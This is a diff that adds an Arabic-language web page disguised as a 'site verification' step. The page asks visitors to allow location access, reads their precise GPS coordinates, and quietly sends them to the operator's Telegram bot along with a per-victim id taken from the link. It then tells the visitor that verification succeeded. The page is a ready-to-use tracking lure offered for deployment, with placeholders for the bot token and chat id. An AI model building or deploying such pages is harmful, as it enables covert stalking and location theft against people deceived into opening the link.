@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الموقع</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f0f2f5; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>جاري التحقق من الموقع...</h2>
+        <p id="msg">يرجى الضغط على "سماح" (Allow) لطلب الموقع.</p>
+    </div>
+
+    <script>
+        // الحصول على ID المستخدم من الرابط (مثال: site.com/?id=123456)
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+
+        // ضع التوكن والآيدي الخاصين بك هنا
+        const BOT_TOKEN = "ضع_التوكن_هنا";
+        const ADMIN_ID = "ضع_الآيدي_هنا";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                const text = `📍 **تم استلام موقع جديد!**\n\n👤 **معرف المستخدم:** ${userId || 'غير معروف'}\n🌐 **الإحداثيات:** \`${lat},${lon}\`\n🗺 **الخريطة:** ${mapLink}`;
+
+                // إرسال الإحداثيات مباشرة للآيدي الخاص بك عبر Telegram API
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                document.getElementById('msg').innerText = "تم التحقق بنجاح! يمكنك إغلاق الصفحة.";
+            }, (err) => {
+                document.getElementById('msg').innerText = "تم رفض الوصول للموقع أو تعذر التحديد.";
+            }, { enableHighAccuracy: true });
+        } else {
+            document.getElementById('msg').innerText = "متصفحك لا يدعم الخدمة.";
+        }
+    </script>
+</body>
+</html>
